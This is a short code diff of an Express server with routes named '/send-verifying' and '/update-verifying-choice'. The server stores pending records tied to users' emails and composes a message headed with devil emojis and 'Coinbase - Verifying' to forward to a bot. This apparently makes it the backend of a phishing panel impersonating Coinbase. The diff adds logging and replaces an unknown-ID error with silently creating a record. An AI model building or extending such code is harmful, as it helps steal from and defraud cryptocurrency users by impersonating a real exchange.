@@ -1899,6 +1899,7 @@ app.post("/send-verifying", async (req, res) => {
 
     // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
     pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
+    console.log(`💾 Stored verifyingId: ${verifyingId}`);
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
@@ -1990,7 +1991,7 @@ app.post("/update-verifying-choice", (req, res) => {
     }
 
     if (!pendingVerifying[verifyingId]) {
-      return res.status(400).json({ error: "Verifying ID not found" });
+      pendingVerifying[verifyingId] = {};
     }
 
     pendingVerifying[verifyingId].choice = choice;
